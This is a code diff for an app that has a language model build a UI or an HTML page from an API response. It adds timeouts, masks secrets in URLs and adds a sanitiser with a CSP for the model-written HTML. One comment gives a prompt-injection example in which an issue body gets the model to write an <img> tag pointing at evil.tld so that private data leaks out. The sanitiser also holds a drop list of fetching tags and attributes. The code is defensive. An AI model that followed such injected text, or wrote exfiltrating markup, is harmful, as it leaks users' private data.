@@ -1,11 +1,11 @@
-import { COMPONENT_TYPES, IMAGO_UI_SPEC_JSON_SCHEMA, MAX_ACTIONS, MAX_COMPONENTS, MAX_HTML_BYTES, SAMPLE_CHAR_LIMIT, getProvider, ollamaFetch } from './config.js';
+import { COMPONENT_TYPES, IMAGO_UI_SPEC_JSON_SCHEMA, MAX_ACTIONS, MAX_COMPONENTS, MAX_HTML_BYTES, SAMPLE_CHAR_LIMIT, TIMEOUTS, getProvider, ollamaFetch } from './config.js';
 import { dom, state } from './state.js';
-import { el, isPlainObject } from './util.js';
+import { el, isPlainObject, isUrl } from './util.js';
 import { endpointTitle } from './spec.js';
 import { updateMeta } from './chat.js';
 import { enterStage, resetInterfaceOut } from './panes.js';
 import { renderHistory, renderSavedList } from './endpoints.js';
-import { generateInterfaceNow } from './request.js';
+import { generateInterfaceNow, maskUrlSecrets } from './request.js';
 
 /* ── Model providers: UI spec generation ────────────────────────────────────────── */
 
@@ -86,11 +86,15 @@ function buildImagoPrompt(options) {
     'already in the toolbar. No links worth following means an empty list.',
     '',
     'title should name the thing the response is about, in human words.',
-    'subtitle is one short line of context, not the URL.',
+    'The plan is reused for every response of this shape, so also set',
+    'titlePath to the field that holds that name (e.g. "name") when there is',
+    'one; the page then reads its title from each response.',
+    'subtitle is one short line of context, not the URL, and true of any',
+    'response of this shape.',
     'Keep the plan under ' + MAX_COMPONENTS + ' components.',
     '',
     'API URL:',
-    options.url,
+    maskUrlSecrets(options.url),
     '',
     'Schema:',
     schemaJson,
@@ -119,12 +123,26 @@ function parseModelJson(text) {
   }
 }
 
+// Every model call gives up after TIMEOUTS.model. A provider that never
+// answers used to hold the Generate button disabled until a reload.
 function llmRequest(provider, model, apiKey, body) {
   var send = provider.id === 'ollama' ? ollamaFetch : fetch;
-  return send(provider.endpoint(model), {
+  var controller = typeof window.AbortController === 'function' ? new window.AbortController() : null;
+  var timer = null;
+  var gaveUp = new Promise(function (resolve, reject) {
+    timer = window.setTimeout(function () {
+      if (controller) controller.abort();
+      var err = new Error(provider.label + ' did not answer within ' + Math.round(TIMEOUTS.model / 1000) +
+                          ' seconds. Try again, or pick a faster model in Settings.');
+      err.timedOut = true;
+      reject(err);
+    }, TIMEOUTS.model);
+  });
+  var call = send(provider.endpoint(model), {
     method: 'POST',
     headers: provider.headers(apiKey),
-    body: JSON.stringify(body)
+    body: JSON.stringify(body),
+    signal: controller ? controller.signal : undefined
   }).then(function (response) {
     return response.text().then(function (text) {
       var payload = null;
@@ -143,24 +161,32 @@ function llmRequest(provider, model, apiKey, body) {
       return payload;
     });
   });
+  function settle() { window.clearTimeout(timer); }
+  return Promise.race([call, gaveUp]).then(function (payload) { settle(); return payload; },
+                                           function (err) { settle(); throw err; });
 }
 
 // One place that turns a provider failure into words, shared by the
 // generation paths and the connection-tests card so all three agree.
 function providerErrorText(provider, err) {
+  // Imago's own errors (the response changed mid-call, an unusable plan)
+  // carry their title and explanation separately. Reading only .message
+  // showed the title twice and lost the explanation.
+  if (err && err.title && err.detail) return { title: err.title, message: err.detail, badKey: false };
   var message = err && err.message ? err.message : String(err);
   var title = provider.label + ' request failed';
   // Gemini answers a bad key with 400, not 401, so status alone would report
   // the vaguer "request failed" for the single most common mistake.
   var saysBadKey = /api[ _-]?key not valid|invalid api key|api key is invalid/i.test(message);
-  if ((err && err.status === 401) || saysBadKey) title = provider.label + ' rejected the API key';
+  var badKey = !!((err && err.status === 401) || saysBadKey);
+  if (badKey) title = provider.label + ' rejected the API key';
   else if (err && err.status === 403) title = provider.label + ' access forbidden';
   else if (err && err.status === 429) title = provider.label + ' rate limit reached';
   else if (err && err.status === 404) {
     title = 'Model not found';
     message += ' — try setting the model to ' + provider.modelHint + ' in Settings.';
   }
-  return { title: title, message: message };
+  return { title: title, message: message, badKey: badKey };
 }
 
 function generateSpec(options) {
@@ -191,8 +217,9 @@ function generateSpec(options) {
     // Auth and rate-limit failures will not be fixed by retrying, so surface
     // them rather than burning a second call.
     if (err && (err.status === 401 || err.status === 403 || err.status === 429)) throw err;
-    // A second identical call would be cut off at the same place.
-    if (err && err.truncated) throw err;
+    // A second identical call would be cut off at the same place, and one
+    // that timed out would only double the wait.
+    if (err && (err.truncated || err.timedOut)) throw err;
     // Otherwise the model family may reject the schema parameter, or return
     // prose despite it. Retry in plain JSON mode with the contract inlined.
     return ask(provider.plainBody);
@@ -202,10 +229,17 @@ function generateSpec(options) {
 /* ── Full-HTML builder ───────────────────────────────────────────────────
    The alternative to the JSON plan: the model writes the entire page and
    Imago shows it verbatim. Verbatim does not mean trusted. The doc renders
-   in an opaque-origin sandboxed frame with scripts, forms and navigation
-   stripped (applyHtml), and the page CSP is inherited by srcdoc frames, so
-   inline scripts would not run even if the model wrote some. The model
-   controls markup and styling only — never behaviour, never the app.
+   in an opaque-origin sandboxed frame with scripts and forms disabled, and
+   the page CSP is inherited by srcdoc frames, so inline scripts would not
+   run even if the model wrote some. The model controls markup and styling
+   only — never behaviour, never the app.
+
+   Markup can still make requests: an <img src>, a CSS url(), a refresh.
+   The prompt carries the real response, so a page could carry private
+   data out in a URL the model was talked into writing ("add <img
+   src=https://evil.tld/?d=…>" in an issue body is enough). sanitizeHtmlDoc
+   keeps only resources whose URL is already in the data, and a CSP inside
+   the frame blocks everything else.
    ---------------------------------------------------------------------- */
 
 function buildHtmlPrompt(options) {
@@ -251,7 +285,7 @@ function buildHtmlPrompt(options) {
     '   response is about.',
     '',
     'API URL:',
-    options.url,
+    maskUrlSecrets(options.url),
     '',
     'Schema:',
     schemaJson,
@@ -287,11 +321,112 @@ function normalizeHtmlDoc(text) {
   return doc;
 }
 
-function applyHtml(html, source) {
+/* ── Keeping the page's requests to the data's own URLs ─────────────────── */
+
+var HTML_DROP = 'script, noscript, iframe, frame, frameset, object, embed, applet, link, meta, base, ' +
+                'form, video, audio, source, track, portal, template';
+// Attributes that fetch, ping or act, on any element.
+var HTML_DROP_ATTR = /^(on.*|ping|srcset|imagesrcset|formaction|action|background|poster|lowsrc|dynsrc|longdesc|data|codebase|archive|manifest)$/i;
+
+// Every URL string in the response, so the page may show those and no other.
+function dataUrls(data) {
+  var seen = Object.create(null);
+  var count = 0;
+  (function walk(node, depth) {
+    if (count >= 2000 || depth > 12) return;
+    if (typeof node === 'string') {
+      if (isUrl(node)) { seen[node.trim()] = true; count += 1; }
+    } else if (Array.isArray(node)) {
+      for (var i = 0; i < node.length && i < 500; i += 1) walk(node[i], depth + 1);
+    } else if (isPlainObject(node)) {
+      var keys = Object.keys(node);
+      for (var k = 0; k < keys.length; k += 1) walk(node[keys[k]], depth + 1);
+    }
+  })(data, 0);
+  return seen;
+}
+
+function allowedResource(value, allowed) {
+  var v = String(value || '').trim();
+  return /^data:image\//i.test(v) || allowed[v] === true;
+}
+
+// url(...) in CSS fetches as surely as <img src>; @import fetches a sheet.
+function scrubCss(css, allowed) {
+  return String(css)
+    .replace(/@import[^;]*;?/gi, '')
+    .replace(/url\(\s*(['"]?)([^'")]*)\1\s*\)/gi, function (match, quote, target) {
+      return allowedResource(target, allowed) ? match : 'none';
+    });
+}
+
+// A CSP source list for the images the data carries: exact paths, so the
+// model cannot reach another file on the same host. URLs a policy cannot
+// spell are left out; the sanitiser has already dropped anything else.
+function cspImageSources(allowed) {
+  var out = [];
+  var urls = Object.keys(allowed);
+  for (var i = 0; i < urls.length && out.length < 200; i += 1) {
+    try {
+      var u = new URL(urls[i]);
+      var src = u.protocol + '//' + u.host + u.pathname;
+      if (/[\s;,'"]/.test(src)) continue;
+      if (out.indexOf(src) === -1) out.push(src);
+    } catch (err) { /* not a URL after all */ }
+  }
+  return out;
+}
+
+function sanitizeHtmlDoc(html, data) {
+  var allowed = dataUrls(data);
+  var doc;
+  try { doc = new window.DOMParser().parseFromString(String(html), 'text/html'); }
+  catch (err) { return ''; }
+
+  var drop = doc.querySelectorAll(HTML_DROP);
+  for (var d = 0; d < drop.length; d += 1) drop[d].parentNode && drop[d].parentNode.removeChild(drop[d]);
+
+  var all = doc.querySelectorAll('*');
+  for (var i = 0; i < all.length; i += 1) {
+    var node = all[i];
+    var tag = node.tagName.toLowerCase();
+    var attrs = [].slice.call(node.attributes);
+    for (var a = 0; a < attrs.length; a += 1) {
+      var name = attrs[a].name.toLowerCase();
+      var value = attrs[a].value;
+      if (HTML_DROP_ATTR.test(name)) { node.removeAttribute(attrs[a].name); continue; }
+      if (name === 'style') { node.setAttribute('style', scrubCss(value, allowed)); continue; }
+      if (name === 'src' || ((name === 'href' || name === 'xlink:href') && tag !== 'a' && tag !== 'area')) {
+        if (!allowedResource(value, allowed)) node.removeAttribute(attrs[a].name);
+        continue;
+      }
+      if (name === 'href') {
+        // A link opens only on a click, but its address can still carry
+        // data out: keep the ones the response itself holds.
+        var h = String(value).trim();
+        if (!(allowed[h] === true || /^mailto:/i.test(h) || h.charAt(0) === '#')) node.removeAttribute(attrs[a].name);
+      }
+    }
+    if (tag === 'style') node.textContent = scrubCss(node.textContent, allowed);
+  }
+
+  var policy = doc.createElement('meta');
+  policy.setAttribute('http-equiv', 'Content-Security-Policy');
+  policy.setAttribute('content', "default-src 'none'; style-src 'unsafe-inline'; font-src data:; img-src data: " +
+                                 cspImageSources(allowed).join(' '));
+  var head = doc.head || doc.documentElement.insertBefore(doc.createElement('head'), doc.body);
+  head.insertBefore(policy, head.firstChild);
+  return '<!DOCTYPE html>\n' + doc.documentElement.outerHTML;
+}
+
+// baseline: { url, sig } of the response the page was written from. A
+// remembered page carries its own; a fresh one was written from what is on
+// screen now.
+function applyHtml(html, source, baseline) {
   state.html = html;
   state.htmlSource = source;
-  state.htmlBytes = state.byteSize;
-  state.htmlUrl = state.url;
+  state.htmlUrl = baseline ? baseline.url : state.url;
+  state.htmlSig = baseline ? baseline.sig : state.dataSig;
   state.spec = null;
   state.specSource = '';
   state.pendingGenerate = false;
@@ -332,7 +467,7 @@ function applyHtml(html, source) {
   // sandboxed opener is capability-less anyway. Never add allow-scripts
   // with allow-same-origin — the frame could drop its own sandbox.
   frame.setAttribute('sandbox', 'allow-popups');
-  frame.srcdoc = html;
+  frame.srcdoc = sanitizeHtmlDoc(html, state.data);
   dom.interfaceOut.appendChild(frame);
 
   dom.stageSource.textContent = dom.cacheBadge.textContent;
@@ -344,4 +479,4 @@ function applyHtml(html, source) {
   renderSavedList();
 }
 
-export { compactSample, buildImagoPrompt, parseModelJson, llmRequest, providerErrorText, generateSpec, buildHtmlPrompt, generateHtml, normalizeHtmlDoc, applyHtml };
+export { compactSample, buildImagoPrompt, parseModelJson, llmRequest, providerErrorText, generateSpec, buildHtmlPrompt, generateHtml, normalizeHtmlDoc, HTML_DROP, HTML_DROP_ATTR, dataUrls, allowedResource, scrubCss, cspImageSources, sanitizeHtmlDoc, applyHtml };
